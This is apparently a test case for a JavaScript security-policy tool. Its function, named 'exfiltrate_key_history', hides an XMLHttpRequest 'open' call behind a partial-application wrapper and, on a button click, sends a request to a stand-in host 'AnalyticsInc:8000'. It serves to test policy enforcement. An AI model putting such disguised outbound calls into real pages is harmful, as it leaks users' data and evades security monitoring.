
JAM.startProfile('load');
function exfiltrate_key_history() {
  function partial(func$$3) {
    function v0() {
      var v8 = Array.prototype;
      var v5 = v8.slice;
      var v1 = JAM.call(v5.call, v5, [arguments], JAM.policy.p1);
      var allArguments = JAM.call(args.concat, args, [v1], JAM.policy.p1);
      return JAM.call(func$$3.apply, func$$3, [this, allArguments], JAM.policy.p1)
    }
    var v6 = Array.prototype;
    var v2 = v6.slice;
    var args = JAM.call(v2.call, v2, [arguments, 1], JAM.policy.p1);
    return v0
  }
  xmlhttp = new XMLHttpRequest;
  var v3 = xmlhttp;
  var v7 = xmlhttp.open;
  var v9 = partial(v7, "GET", "http://AnalyticsInc:8000/submission.html?test=partial", true);
  v3.openn = v9;
  JAM.call(xmlhttp.openn, xmlhttp, [], JAM.policy.p1);
  JAM.call(xmlhttp.send, xmlhttp, [null], JAM.policy.p1);
  return
}
var v4 = document.getElementById("test");
JAM.set(v4, "onclick", exfiltrate_key_history);

JAM.stopProfile('load');
